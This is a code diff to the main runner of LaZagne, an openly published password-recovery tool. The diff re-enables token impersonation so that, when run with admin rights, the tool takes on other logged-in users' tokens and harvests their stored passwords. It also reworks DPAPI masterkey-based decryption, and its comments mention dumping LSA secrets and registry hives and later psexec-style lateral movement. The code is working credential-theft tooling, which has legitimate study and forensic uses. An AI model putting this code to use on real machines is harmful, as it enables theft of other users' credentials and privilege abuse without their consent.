@@ -6,9 +6,9 @@ import logging
 import sys
 import traceback
 
-# from lazagne.config.change_privileges import list_sids, rev2self, impersonate_sid_long_handle
+from lazagne.config.change_privileges import list_sids, rev2self, impersonate_sid_long_handle
 from lazagne.config.users import get_user_list_on_filesystem, set_env_variables
-from lazagne.config.dpapi_structure import UserDpapi, SystemDpapi
+from lazagne.config.dpapi_structure import SystemDpapi, are_masterkeys_retrieved
 from lazagne.config.execute_cmd import save_hives, delete_hives
 from lazagne.config.write_output import print_debug, StandardOutput
 from lazagne.config.constant import constant
@@ -98,6 +98,10 @@ def run_modules(module, subcategories={}, system_module=False):
 
 
 def run_category(category_selected, subcategories={}, system_module=False):
+    constant.module_to_exec_at_end = {
+        "winapi": [],
+        "dpapi": [],
+    }
     modules = create_module_dic()
     categories = [category_selected] if category_selected != 'all' else get_categories()
     for category in categories:
@@ -112,23 +116,13 @@ def run_category(category_selected, subcategories={}, system_module=False):
                     yield m
 
             if constant.module_to_exec_at_end.get('dpapi', []):
-                # These modules will need the windows user password to be able to decrypt dpapi blobs
-                constant.user_dpapi = UserDpapi(password=constant.user_password)
-                # Add username to check username equals passwords
-                constant.password_found.append(constant.username)
-                constant.user_dpapi.check_credentials(constant.password_found)
-                if constant.user_dpapi.unlocked:
+                if are_masterkeys_retrieved():
                     for module in constant.module_to_exec_at_end.get('dpapi', []):
                         for m in run_module(title=module['title'], module=module['module']):
                             yield m
         else:
-            if constant.module_to_exec_at_end.get('dpapi', []) or  constant.module_to_exec_at_end.get('winapi', []):
-                # These modules will need the windows user password to be able to decrypt dpapi blobs
-                constant.user_dpapi = UserDpapi(password=constant.user_password)
-                # Add username to check username equals passwords
-                constant.password_found.append(constant.username)
-                constant.user_dpapi.check_credentials(constant.password_found)
-                if constant.user_dpapi.unlocked:
+            if constant.module_to_exec_at_end.get('dpapi', []) or constant.module_to_exec_at_end.get('winapi', []):
+                if are_masterkeys_retrieved():
                     # Execute winapi/dpapi modules - winapi decrypt blob using dpapi without calling CryptUnprotectData
                     for i in ['winapi', 'dpapi']:
                         for module in constant.module_to_exec_at_end.get(i, []):
@@ -142,6 +136,8 @@ def run_lazagne(category_selected='all', subcategories={}, password=None):
     - If admin:
         - Execute system modules to retrieve LSA Secrets and user passwords if possible
             - These secret could be useful for further decryption (e.g Wifi)
+        - If a process of another user is launched try to impersone it (impersonating his token)
+            - TO DO: if hashdump retrieved other local account, launch a new process using psexec techniques 
     - From our user:
         - Retrieve all passwords using their own password storage algorithm (Firefox, Pidgin, etc.)
         - Retrieve all passwords using Windows API - CryptUnprotectData (Chrome, etc.)
@@ -180,20 +176,20 @@ def run_lazagne(category_selected='all', subcategories={}, password=None):
             try:
                 for r in run_category(category_selected, subcategories, system_module=True):
                     yield r
-
-            # Let empty this except - should catch all exceptions to be sure to remove temporary files
-            except:
+            except:  # Catch all kind of exceptions
+                pass
+            finally:
                 delete_hives()
 
             constant.stdout_result.append(constant.finalResults)
-            delete_hives()
 
     # ------ Part used for user impersonation ------
 
+    constant.is_current_user = True
     # constant.username = getpass.getuser().decode(sys.getfilesystemencoding())
     constant.username = getpass.getuser()
     if not constant.username.endswith('$'):
-        constant.is_current_user = True
+        
         constant.finalResults = {'User': constant.username}
         constant.st.print_user(constant.username)
         yield 'User', constant.username
@@ -203,53 +199,52 @@ def run_lazagne(category_selected='all', subcategories={}, password=None):
         for r in run_category(category_selected, subcategories):
             yield r
         constant.stdout_result.append(constant.finalResults)
-
-    constant.is_current_user = False
+    
     # Check if admin to impersonate
     if ctypes.windll.shell32.IsUserAnAdmin() != 0:
 
-    # Broken => TO REMOVE !!!
-    #     # --------- Impersonation using tokens ---------
+        # --------- Impersonation using tokens ---------
 
-    #     sids = list_sids()
-    #     impersonate_users = {}
-    #     impersonated_user = [constant.username]
+        sids = list_sids()
+        impersonate_users = {}
+        impersonated_user = [constant.username]
 
-    #     for sid in sids:
-    #         # Not save the current user's SIDs and not impersonate system user
-    #         if constant.username != sid[3].split('\\', 1)[1] and sid[2] != 'S-1-5-18':
-    #             impersonate_users.setdefault(sid[3].split('\\', 1)[1], []).append(sid[2])
+        for sid in sids:
+            # Not save the current user's SIDs and not impersonate system user
+            if constant.username != sid[3] and sid[2] != 'S-1-5-18':
+                impersonate_users.setdefault(sid[3], []).append(sid[2])
 
-    #     for user in impersonate_users:
-    #         if 'service' in user.lower().strip():
-    #             continue
+        for user in impersonate_users:
+            if 'service' in user.lower().strip():
+                continue
 
-    #         # Do not impersonate the same user twice
-    #         if user in impersonated_user:
-    #             continue
+            # Do not impersonate the same user twice
+            if user in impersonated_user:
+                continue
 
-    #         constant.st.print_user(user)
-    #         yield 'User', user
+            constant.st.print_user(user)
+            yield 'User', user
 
-    #         constant.finalResults = {'User': user}
-    #         for sid in impersonate_users[user]:
-    #             try:
-    #                 set_env_variables(user, to_impersonate=True)
-    #                 impersonate_sid_long_handle(sid, close=False)
-    #                 impersonated_user.append(user)
+            constant.finalResults = {'User': user}
+            for sid in impersonate_users[user]:
+                try:
+                    set_env_variables(user, to_impersonate=True)
+                    if impersonate_sid_long_handle(sid, close=False):
+                        impersonated_user.append(user)
 
-    #                 # Launch module wanted
-    #                 for r in run_category(category_selected, subcategories):
-    #                     yield r
+                        # Launch module wanted
+                        for r in run_category(category_selected, subcategories):
+                            yield r
 
-    #                 rev2self()
-    #                 constant.stdout_result.append(constant.finalResults)
-    #                 break
-    #             except Exception:
-    #                 print_debug('DEBUG', traceback.format_exc())
+                        rev2self()
+                        constant.stdout_result.append(constant.finalResults)
+                        break
+                except Exception:
+                    print_debug('DEBUG', traceback.format_exc())
 
         # --------- Impersonation browsing file system ---------
 
+        constant.is_current_user = False
         # Ready to check for all users remaining
         all_users = get_user_list_on_filesystem(impersonated_user=[constant.username])
         for user in all_users:
